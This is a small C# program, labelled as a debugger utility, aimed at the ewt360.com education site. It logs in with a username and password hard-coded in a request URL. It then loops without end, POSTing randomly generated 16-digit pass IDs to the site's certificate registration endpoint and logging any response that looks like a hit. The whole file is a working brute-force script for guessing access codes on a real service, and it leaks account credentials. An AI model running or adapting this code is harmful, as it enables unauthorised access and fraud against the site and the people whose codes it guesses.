using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Lsj.Util.Net.Web;
using System.Net;
using Lsj.Util.Net.Web.Website;
using Lsj.Util.Net.Web.Protocol;

namespace Lsj.Util.Debugger
{
    class Program
    {
        static void Main(string[] args)
        {
            //login
            MyHttpWebClient client = new MyHttpWebClient();
            var result = client.GetResponseString(new Uri("http://passport.ewt360.com/login/prelogin?username=sdzxwxlsj&password=sdlsj007"), eHttpMethod.POST,new byte[] { });
            Log.Log.Default.Info(result);
            string a = "1234567890";
            while (true)
            {
                StringBuilder sb = new StringBuilder();
                Random random = new Random();
                for(int i=0;i<16;i++)
                {
                    sb.Append(a.Substring(random.Next(0, 10), 1));
                }
               
                var data = "passid=" + sb.ToString() + "&province=370000";
                Log.Log.Default.Info(data);
                result = client.GetResponseString(new Uri("http://www.ewt360.com/register2/certificate"), eHttpMethod.POST, data);
                if (result.IndexOf("300") > 0)
                {
                    Log.Log.Default.Warn(result);
                }
                Log.Log.Default.Debug(result);
            }
        }
    }
}
